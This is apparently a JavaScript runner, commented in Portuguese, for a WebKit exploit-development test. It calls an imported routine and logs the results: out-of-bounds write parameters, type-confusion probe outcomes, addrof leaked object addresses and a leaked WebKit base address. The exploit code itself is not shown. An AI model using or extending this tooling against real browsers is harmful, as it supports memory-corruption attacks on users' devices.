// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43 - WebKit Leak - Massive Tests)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT // Este é o nome base exportado pelo módulo de teste
} from './testArrayBufferVictimCrash.mjs'; // O nome do arquivo não mudou

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_Massive"; // Atualizar nome do runner
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    // Usar o nome do módulo importado, que reflete a versão "Massive" se foi alterado no arquivo de teste
    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(Massive): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        // Atualizar para usar o novo 'oob_params_of_best_result'
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor: ${result.oob_params_of_best_result.value}`;
        }
        logS3(`  RUNNER R43(Massive): Completou. Melhores Parâmetros OOB: ${bestParamsMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(Massive): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        logS3(`  RUNNER R43(Massive): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            logS3(`  RUNNER R43(Massive): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(Massive): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(Massive): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(Massive): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        // Títulos de página
        let finalTitleSegment = "No TC Confirmed";
        if (webkitLeakResult?.success) {
            finalTitleSegment = "WebKitLeak SUCCESS!";
        } else if (addrofResult?.success) {
            finalTitleSegment = "Addrof OK, WebKitLeak Fail";
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC OK, Addrof/WebKitLeak Fail";
        }
        document.title = `${module_name_for_title}_R43M: ${finalTitleSegment}`; // R43M para Massive

        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(Massive): Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const addrofSuccessThisIter = iter_sum.addrof_result_this_iter?.success ?? 'N/A';
                const addrofCandidateThisIter = iter_sum.addrof_result_this_iter?.leaked_object_addr_candidate_str ?? 'N/A';
                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? 'N/A';
                // Incluir o offset da iteração no log
                let logMsg = `    Iter ${index + 1} (Offset ${iter_sum.oob_offset}, OOB ${iter_sum.oob_value}): TC=${tcSuccess}, AddrofIter=${addrofSuccessThisIter}`;
                if(addrofSuccessThisIter === false && addrofCandidateThisIter !== 'N/A') logMsg += ` (CandIter: ${addrofCandidateThisIter})`;
                logMsg += `, WebKitLeakIter=${webkitLeakSuccess}`;
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;

                logS3(logMsg, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}_R43M: Invalid Result Obj`; // R43M para Massive
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    // O nome do orquestrador também pode ser atualizado para refletir "Massive"
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_Massive`;
    logS3(`==== INICIANDO Script 3 R43M (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR); // R43M para Massive
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43M (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR); // R43M para Massive
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    // Ajustar a lógica do título final se necessário, para consistência com "R43M"
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("SUCCESS") &&
        !document.title.includes("Fail") &&
        !document.title.includes("OK") &&
        !document.title.includes("Confirmed") &&
        !document.title.includes("ERR") && // Adicionar verificação de erro
        !document.title.includes("Invalid")) { // Adicionar verificação de inválido
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43M_Done`;
    }
}
